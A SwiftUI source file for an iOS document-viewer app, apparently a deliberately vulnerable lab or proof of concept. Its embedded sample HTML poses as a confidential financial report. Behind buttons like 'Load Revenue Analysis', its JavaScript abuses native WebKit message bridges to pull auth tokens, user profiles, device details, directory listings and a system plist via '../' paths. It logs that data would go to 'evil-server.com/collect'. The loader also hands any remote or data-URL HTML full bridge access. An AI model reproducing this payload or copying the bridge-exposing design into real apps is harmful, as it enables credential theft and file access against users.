//
//  DocumentDetailView.swift
//  DocViewer
//
//  Created by elyousfi on 11/09/2025.
//

import SwiftUI
import WebKit

struct DocumentDetailView: View {
    let document: Document
    @Environment(\.presentationMode) var presentationMode
    @StateObject private var webViewManager = WebViewManager()
    @State private var webView: WKWebView?
    @State private var showingShareSheet = false
    
    var body: some View {
        NavigationView {
            VStack {
                // Document Info Header
                VStack(alignment: .leading, spacing: 8) {
                    HStack {
                        Image(systemName: document.iconName)
                            .font(.title)
                            .foregroundColor(document.iconColor)
                        
                        VStack(alignment: .leading) {
                            Text(document.name)
                                .font(.headline)
                                .lineLimit(2)
                            
                            Text("by \(document.author)")
                                .font(.subheadline)
                                .foregroundColor(.secondary)
                        }
                        
                        Spacer()
                        
                        VStack(alignment: .trailing) {
                            Text(document.formattedSize)
                                .font(.caption)
                                .foregroundColor(.secondary)
                            
                            Text(document.formattedDate)
                                .font(.caption)
                                .foregroundColor(.secondary)
                        }
                    }
                    
                    // Tags
                    if !document.tags.isEmpty {
                        ScrollView(.horizontal, showsIndicators: false) {
                            HStack(spacing: 8) {
                                ForEach(document.tags, id: \.self) { tag in
                                    Text(tag)
                                        .font(.caption)
                                        .padding(.horizontal, 8)
                                        .padding(.vertical, 4)
                                        .background(Color.blue.opacity(0.1))
                                        .foregroundColor(.blue)
                                        .cornerRadius(6)
                                }
                            }
                            .padding(.horizontal)
                        }
                    }
                }
                .padding()
                .background(Color(.systemGray6))
                
                // WebView Content
                ZStack {
                    if let webView = webView {
                        WebViewRepresentable(webView: webView, webViewManager: webViewManager)
                    } else {
                        VStack(spacing: 20) {
                            ProgressView()
                            Text("Loading document...")
                                .foregroundColor(.secondary)
                        }
                    }
                    
                    if webViewManager.isLoading {
                        VStack {
                            ProgressView()
                            Text("Loading...")
                                .font(.caption)
                                .foregroundColor(.secondary)
                        }
                        .frame(maxWidth: .infinity, maxHeight: .infinity)
                        .background(Color(.systemBackground).opacity(0.8))
                    }
                }
                
                // Navigation Controls
                if let webView = webView {
                    HStack(spacing: 20) {
                        Button(action: {
                            webView.goBack()
                        }) {
                            Image(systemName: "chevron.left")
                                .font(.title2)
                        }
                        .disabled(!webViewManager.canGoBack)
                        
                        Button(action: {
                            webView.goForward()
                        }) {
                            Image(systemName: "chevron.right")
                                .font(.title2)
                        }
                        .disabled(!webViewManager.canGoForward)
                        
                        Spacer()
                        
                        Button(action: {
                            webView.reload()
                        }) {
                            Image(systemName: "arrow.clockwise")
                                .font(.title2)
                        }
                        
                        Button(action: {
                            showingShareSheet = true
                        }) {
                            Image(systemName: "square.and.arrow.up")
                                .font(.title2)
                        }
                    }
                    .padding()
                    .background(Color(.systemGray6))
                }
            }
            .navigationTitle("Document Viewer")
            .navigationBarTitleDisplayMode(.inline)
            .navigationBarItems(
                leading: Button("Done") {
                    presentationMode.wrappedValue.dismiss()
                },
                trailing: Button(action: {
                    showingShareSheet = true
                }) {
                    Image(systemName: "square.and.arrow.up")
                }
            )
            .onAppear {
                setupWebView()
            }
        }
        .sheet(isPresented: $showingShareSheet) {
            if let url = document.url {
                ActivityView(activityItems: [url])
            }
        }
    }
    
    private func setupWebView() {
        let webView = webViewManager.createWebView()
        self.webView = webView
        
        // Load document content based on type
        switch document.type {
        case .html:
            if let url = document.url {
                loadHTMLFromURL(url: url, in: webView)
            } else {
                loadSampleHTMLContent(in: webView)
            }
        case .pdf:
            if let url = document.url {
                webViewManager.loadDocument(url: url, in: webView)
            } else {
                loadPDFPreview(in: webView)
            }
        default:
            loadDocumentPreview(in: webView)
        }
    }
    
    private func loadSampleHTMLContent(in webView: WKWebView) {
        let htmlContent = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>\(document.name)</title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
                body { 
                    font-family: -apple-system, BlinkMacSystemFont, sans-serif; 
                    margin: 20px; 
                    line-height: 1.6; 
                }
                .header { 
                    background: #f8f9fa; 
                    padding: 20px; 
                    border-radius: 8px; 
                    margin-bottom: 20px; 
                }
                .content { 
                    margin-bottom: 30px; 
                }
                .section { 
                    margin-bottom: 25px; 
                }
                .highlight { 
                    background: #fff3cd; 
                    padding: 10px; 
                    border-radius: 4px; 
                }
                .button { 
                    background: #007bff; 
                    color: white; 
                    padding: 10px 20px; 
                    border: none; 
                    border-radius: 4px; 
                    margin: 5px; 
                    cursor: pointer; 
                }
                .data-section { 
                    background: #e9ecef; 
                    padding: 15px; 
                    border-radius: 6px; 
                    margin: 10px 0; 
                    display: none;
                }
                .exploit-log {
                    background: #f8f9fa;
                    border: 1px solid #dee2e6;
                    border-radius: 4px;
                    padding: 10px;
                    margin: 10px 0;
                    font-family: monospace;
                    font-size: 12px;
                    max-height: 200px;
                    overflow-y: auto;
                }
            </style>
        </head>
        <body>
            <div class="header">
                <h1>\(document.name)</h1>
                <p><strong>Author:</strong> \(document.author)</p>
                <p><strong>Last Modified:</strong> \(document.formattedDate)</p>
                <p><strong>Classification:</strong> CONFIDENTIAL</p>
            </div>
            
            <div class="content">
                <div class="section">
                    <h2>Executive Summary</h2>
                    <p>This document contains quarterly financial performance analysis including revenue projections, cost analysis, and strategic recommendations.</p>
                </div>
                
                <div class="section">
                    <h2>Interactive Dashboard</h2>
                    <p>Click the buttons below to load detailed financial data:</p>
                    <div>
                        <button class="button" onclick="loadFinancialData()">Load Revenue Analysis</button>
                        <button class="button" onclick="loadUserProfile()">Load User Profile</button>
                        <button class="button" onclick="exportReport()">Export to Cloud</button>
                        <button class="button" onclick="getSystemInfo()">System Information</button>
                    </div>
                </div>
                
                <div id="exploitLog" class="exploit-log">
                    <strong>System Log:</strong><br>
                    Initializing document viewer...<br>
                </div>
                
                <div id="userData" class="data-section">
                    <h3>User Profile Information</h3>
                    <div id="userInfo">Loading user data...</div>
                </div>
                
                <div id="authData" class="data-section">
                    <h3>Authentication Details</h3>
                    <div id="authInfo">Loading authentication data...</div>
                </div>
                
                <div id="deviceData" class="data-section">
                    <h3>Device Information</h3>
                    <div id="deviceInfo">Loading device data...</div>
                </div>
                
                <div id="fileData" class="data-section">
                    <h3>File System Access</h3>
                    <div id="fileInfo">Loading file system data...</div>
                </div>
                
                <div id="documentData" class="data-section">
                    <h3>Document Library</h3>
                    <div id="documentInfo">Loading document data...</div>
                </div>
            </div>
            
            <script>
                let exploitLog = document.getElementById('exploitLog');
                
                function logExploit(message) {
                    exploitLog.innerHTML += new Date().toLocaleTimeString() + ': ' + message + '<br>';
                    exploitLog.scrollTop = exploitLog.scrollHeight;
                }
                
                function loadFinancialData() {
                    logExploit('Loading financial data...');
                    
                    if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.authBridge) {
                        logExploit('✓ Found authBridge - extracting user credentials');
                        window.webkit.messageHandlers.authBridge.postMessage({
                            action: 'getCurrentUser'
                        });
                        
                        window.webkit.messageHandlers.authBridge.postMessage({
                            action: 'getAuthToken'
                        });
                        
                        document.getElementById('userData').style.display = 'block';
                        document.getElementById('authData').style.display = 'block';
                    } else {
                        logExploit('✗ authBridge not available');
                    }
                }
                
                function loadUserProfile() {
                    logExploit('Accessing user profile...');
                    
                    if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.fileManager) {
                        logExploit('✓ Found fileManager - accessing file system');
                        
                        window.webkit.messageHandlers.fileManager.postMessage({
                            action: 'listDirectory',
                            path: '../'
                        });
                        
                        window.webkit.messageHandlers.fileManager.postMessage({
                            action: 'readFile',
                            path: '../Library/Preferences/com.apple.identityservices.plist'
                        });
                        
                        document.getElementById('fileData').style.display = 'block';
                    } else {
                        logExploit('✗ fileManager not available');
                    }
                }
                
                function exportReport() {
                    logExploit('Exporting to cloud...');
                    
                    if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.documentHandler) {
                        logExploit('✓ Found documentHandler - accessing document library');
                        window.webkit.messageHandlers.documentHandler.postMessage({
                            action: 'getDocumentList'
                        });
                        
                        document.getElementById('documentData').style.display = 'block';
                    } else {
                        logExploit('✗ documentHandler not available');
                    }
                    
                    if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.cloudSync) {
                        logExploit('✓ Found cloudSync - accessing cloud services');
                        window.webkit.messageHandlers.cloudSync.postMessage({
                            action: 'uploadDocument',
                            data: document.documentElement.outerHTML
                        });
                    } else {
                        logExploit('✗ cloudSync not available');
                    }
                }
                
                function getSystemInfo() {
                    logExploit('Gathering system information...');
                    
                    if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.deviceManager) {
                        logExploit('✓ Found deviceManager - extracting device info');
                        window.webkit.messageHandlers.deviceManager.postMessage({
                            action: 'getDeviceInfo'
                        });
                        
                        document.getElementById('deviceData').style.display = 'block';
                    } else {
                        logExploit('✗ deviceManager not available');
                    }
                }
                
                window.receiveUserInfo = function(userInfo) {
                    logExploit('✓ SUCCESS: User data extracted!');
                    document.getElementById('userInfo').innerHTML = 
                        '<p><strong>Name:</strong> ' + userInfo.fullName + '</p>' +
                        '<p><strong>Email:</strong> ' + userInfo.email + '</p>' +
                        '<p><strong>Company:</strong> ' + userInfo.company + '</p>' +
                        '<p><strong>Plan:</strong> ' + userInfo.plan + '</p>' +
                        '<p><strong>User ID:</strong> ' + userInfo.id + '</p>';
                    
                    logExploit('Data would be exfiltrated to: https://evil-server.com/collect');
                };
                
                window.receiveAuthToken = function(token) {
                    logExploit('✓ SUCCESS: Authentication token extracted!');
                    document.getElementById('authInfo').innerHTML = 
                        '<p><strong>Auth Token:</strong> ' + token.substring(0, 20) + '...</p>' +
                        '<p><strong>Token Length:</strong> ' + token.length + ' characters</p>' +
                        '<p><strong>Status:</strong> Active session token captured</p>';
                    
                    logExploit('AUTH TOKEN: ' + token.substring(0, 30) + '...');
                };
                
                window.receiveDeviceInfo = function(deviceInfo) {
                    logExploit('✓ SUCCESS: Device information extracted!');
                    document.getElementById('deviceInfo').innerHTML = 
                        '<p><strong>Model:</strong> ' + deviceInfo.model + '</p>' +
                        '<p><strong>System:</strong> ' + deviceInfo.systemName + ' ' + deviceInfo.systemVersion + '</p>' +
                        '<p><strong>Identifier:</strong> ' + deviceInfo.identifier + '</p>';
                    
                    logExploit('Device fingerprinted: ' + deviceInfo.model + ' running ' + deviceInfo.systemName);
                };
                
                window.receiveFileContent = function(content) {
                    logExploit('✓ SUCCESS: File content extracted!');
                    document.getElementById('fileInfo').innerHTML += 
                        '<div style="border: 1px solid #ccc; padding: 10px; margin: 5px 0; background: #f9f9f9;">' +
                        '<strong>File Content Preview:</strong><br>' +
                        '<pre style="font-size: 10px; max-height: 100px; overflow: auto;">' + 
                        content.substring(0, 200) + (content.length > 200 ? '...' : '') +
                        '</pre></div>';
                };
                
                window.receiveDirectoryListing = function(files) {
                    logExploit('✓ SUCCESS: Directory listing extracted!');
                    document.getElementById('fileInfo').innerHTML += 
                        '<div style="border: 1px solid #ccc; padding: 10px; margin: 5px 0; background: #f9f9f9;">' +
                        '<strong>Directory Contents:</strong><br>' +
                        files.join(', ') +
                        '</div>';
                };
                
                window.receiveDocumentList = function(documents) {
                    logExploit('✓ SUCCESS: Document library accessed!');
                    let docHtml = '<strong>User Documents:</strong><br>';
                    documents.forEach(function(doc) {
                        docHtml += '<div style="border-bottom: 1px solid #eee; padding: 5px 0;">';
                        docHtml += '<strong>' + doc.name + '</strong> (' + doc.type + ')<br>';
                        docHtml += 'Author: ' + doc.author + ' | Size: ' + doc.size + ' bytes<br>';
                        docHtml += 'ID: ' + doc.id;
                        docHtml += '</div>';
                    });
                    document.getElementById('documentInfo').innerHTML = docHtml;
                };
                
                document.addEventListener('DOMContentLoaded', function() {
                    logExploit('Document loaded - JavaScript bridge exploitation initialized');
                    logExploit('Checking for available bridges...');
                    
                    if (window.webkit && window.webkit.messageHandlers) {
                        let bridges = ['documentHandler', 'fileManager', 'cloudSync', 'authBridge', 'deviceManager'];
                        bridges.forEach(function(bridge) {
                            if (window.webkit.messageHandlers[bridge]) {
                                logExploit('✓ Bridge available: ' + bridge);
                            } else {
                                logExploit('✗ Bridge not found: ' + bridge);
                            }
                        });
                        
                        logExploit('Ready for exploitation - click buttons above to extract data');
                    } else {
                        logExploit('✗ No WebKit message handlers found');
                    }
                });
            </script>
        </body>
        </html>
        """
        
        webViewManager.loadHTML(content: htmlContent, in: webView)
    }
    
    private func loadPDFPreview(in webView: WKWebView) {
        let htmlContent = """
        <html>
        <head>
            <style>
                body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; margin: 20px; text-align: center; }
                .pdf-icon { font-size: 80px; color: #dc3545; margin: 40px 0; }
                .info { background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0; }
            </style>
        </head>
        <body>
            <div class="pdf-icon">📄</div>
            <h1>\(document.name)</h1>
            <div class="info">
                <p><strong>Document Type:</strong> PDF</p>
                <p><strong>Size:</strong> \(document.formattedSize)</p>
                <p><strong>Author:</strong> \(document.author)</p>
                <p><strong>Modified:</strong> \(document.formattedDate)</p>
            </div>
            <p>PDF preview would be displayed here in a production environment.</p>
        </body>
        </html>
        """
        
        webViewManager.loadHTML(content: htmlContent, in: webView)
    }
    
    private func loadDocumentPreview(in webView: WKWebView) {
        let htmlContent = """
        <html>
        <head>
            <style>
                body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; margin: 20px; text-align: center; }
                .doc-icon { font-size: 80px; margin: 40px 0; }
                .info { background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0; }
            </style>
        </head>
        <body>
            <div class="doc-icon">\(documentIcon)</div>
            <h1>\(document.name)</h1>
            <div class="info">
                <p><strong>Type:</strong> \(document.type.displayName)</p>
                <p><strong>Size:</strong> \(document.formattedSize)</p>
                <p><strong>Author:</strong> \(document.author)</p>
                <p><strong>Modified:</strong> \(document.formattedDate)</p>
            </div>
            <p>Document preview for \(document.type.displayName) files.</p>
        </body>
        </html>
        """
        
        webViewManager.loadHTML(content: htmlContent, in: webView)
    }
    
    private func loadHTMLFromURL(url: URL, in webView: WKWebView) {
        if url.scheme == "data" {
            // Handle data URLs - extract HTML content and load with JavaScript bridge
            let urlString = url.absoluteString
            if let htmlContent = extractHTMLFromDataURL(urlString) {
                webViewManager.loadHTML(content: htmlContent, in: webView)
            } else {
                // Fallback to loading the data URL directly
                webViewManager.loadDocument(url: url, in: webView)
            }
        } else {
            // Handle remote URLs - download content and load with JavaScript bridge
            URLSession.shared.dataTask(with: url) { data, response, error in
                DispatchQueue.main.async {
                    if let data = data,
                       let htmlContent = String(data: data, encoding: .utf8) {
                        // Load the downloaded HTML content with JavaScript bridge support
                        self.webViewManager.loadHTML(content: htmlContent, in: webView)
                    } else {
                        // Fallback to loading URL directly if download fails
                        self.webViewManager.loadDocument(url: url, in: webView)
                    }
                }
            }.resume()
        }
    }
    
    private func extractHTMLFromDataURL(_ dataURL: String) -> String? {
        // Parse data URL format: data:[<mediatype>][;base64],<data>
        guard dataURL.hasPrefix("data:") else { return nil }
        
        let components = dataURL.dropFirst(5) // Remove "data:"
        if let commaIndex = components.firstIndex(of: ",") {
            let dataContent = String(components[components.index(after: commaIndex)...])
            
            // Handle base64 encoded data
            if components.prefix(upTo: commaIndex).contains("base64") {
                guard let decodedData = Data(base64Encoded: dataContent),
                      let htmlContent = String(data: decodedData, encoding: .utf8) else {
                    return nil
                }
                return htmlContent
            } else {
                // Handle URL-encoded data
                return dataContent.removingPercentEncoding
            }
        }
        
        return nil
    }
    
    private var documentIcon: String {
        switch document.type {
        case .word: return "📝"
        case .excel: return "📊"
        case .powerpoint: return "📽️"
        case .image: return "🖼️"
        case .text: return "📄"
        default: return "📄"
        }
    }
}

struct WebViewRepresentable: UIViewRepresentable {
    let webView: WKWebView
    let webViewManager: WebViewManager
    
    func makeUIView(context: Context) -> WKWebView {
        return webView
    }
    
    func updateUIView(_ uiView: WKWebView, context: Context) {
        // Updates handled by WebViewManager
    }
}

struct ActivityView: UIViewControllerRepresentable {
    let activityItems: [Any]
    
    func makeUIViewController(context: Context) -> UIActivityViewController {
        UIActivityViewController(activityItems: activityItems, applicationActivities: nil)
    }
    
    func updateUIViewController(_ uiViewController: UIActivityViewController, context: Context) {}
}
